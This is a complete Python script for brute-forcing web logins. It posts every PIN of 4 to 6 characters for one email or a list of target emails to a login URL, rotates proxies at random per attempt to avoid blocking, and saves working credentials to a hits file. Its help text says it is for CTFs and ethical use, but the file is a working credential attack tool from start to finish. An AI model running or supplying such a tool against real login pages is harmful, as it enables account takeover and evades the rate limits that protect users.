#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import itertools
import argparse
import random
import time
import threading
import os

attempts = 0
attempts_lock = threading.Lock()

def attack(url, email, pin, delay, verbose, email_param="email", pin_param="pin", proxies=None):
    global attempts
    session = requests.Session()

    if proxies:
        session.proxies.update(proxies)

    data = {email_param: email, pin_param: pin}

    try:
        response = session.post(url, data=data, allow_redirects=False)

        with attempts_lock:
            attempts += 1
            if verbose and attempts % 100 == 0:
                print(f"[~] Attempts: {attempts} | Current: {email}:{pin}")

        if "success" in response.headers.get("Location", "") or response.status_code == 302:
            print(f"[+] SUCCESS: {email}:{pin}")
            with open("hits.txt", "a") as f:
                f.write(f"{email}:{pin}\n")
    except Exception as e:
        print(f"[!] Error with {email}:{pin} — {e}")
    
    if delay > 0:
        time.sleep(delay)

def generate_pins(min_len, max_len, charset):
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            yield ''.join(combo)

def main():
    parser = argparse.ArgumentParser(description="Brute force login utility (for CTFs / ethical use)")
    parser.add_argument("--min-digits", type=int, default=4, help="Minimum length of PIN")
    parser.add_argument("--max-digits", type=int, default=6, help="Maximum length of PIN")
    parser.add_argument("--email", type=str, help="Target email")
    parser.add_argument("--email-file", type=str, default="emails.txt", help="File containing list of target emails")
    parser.add_argument("--url", type=str, default="http://192.168.1.218:5000/login", help="Target login URL")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay (in seconds) between attempts")
    parser.add_argument("--charset", type=str, default="0123456789", help="Character set to use for PIN generation")
    parser.add_argument("--verbose", action="store_true", help="Enable status updates during brute force")
    parser.add_argument("--email-param", type=str, default="email", help="Parameter name for email")
    parser.add_argument("--pin-param", type=str, default="pin", help="Parameter name for PIN")
    parser.add_argument("--proxy", type=str, help="Single proxy URL (http:// or socks5h://)")
    parser.add_argument("--proxy-list", type=str, help="File containing list of proxy URLs to rotate")
    
    args = parser.parse_args()

    print(f"[*] Target URL: {args.url}")
    print(f"[*] Using email: {args.email}")
    print(f"[*] Using email file: {args.email_file}")
    print(f"[*] Digits: {args.min_digits} to {args.max_digits}")
    print(f"[*] Threads: {args.threads}")
    print(f"[*] Charset: {args.charset}")
    print(f"[*] Delay: {args.delay} seconds")
    print(f"[*] Verbose: {args.verbose}")
    print(f"[*] Proxy: {args.proxy}")

    proxies = None
    proxy_list = []

    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }

    elif args.proxy_list:
        with open(args.proxy_list, 'r') as f:
            proxy_list = [line.strip() for line in f if line.strip()]
        if not proxy_list:
            raise ValueError("Proxy list is empty or invalid")


    if args.email:
        emails = [args.email]
    elif args.email_file:
        with open(args.email_file, 'r') as f:
            emails = [line.strip() for line in f if line.strip()]
    else:
        raise ValueError("Either --email or --email-file must be specified")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for email in emails:
            for pin in generate_pins(args.min_digits, args.max_digits, args.charset):
                # Select proxy randomly per attempt
                chosen_proxy = random.choice(proxy_list) if proxy_list else args.proxy
                chosen_proxies = {
                    "http": chosen_proxy,
                    "https": chosen_proxy
                } if chosen_proxy else None

                futures.append(executor.submit(
                    attack, args.url, email, pin, args.delay, args.verbose,
                    args.email_param, args.pin_param, chosen_proxies
                ))

        for _ in as_completed(futures):
            pass

if __name__ == '__main__':
    main()
    print(f"[*] Total attempts: {attempts}")

    if os.path.exists("hits.txt"):
        with open("hits.txt", "r") as f:
            hits_count = len(f.readlines())
        print(f"[*] Total hits: {hits_count}")
    else:
        print("[*] Total hits: 0")
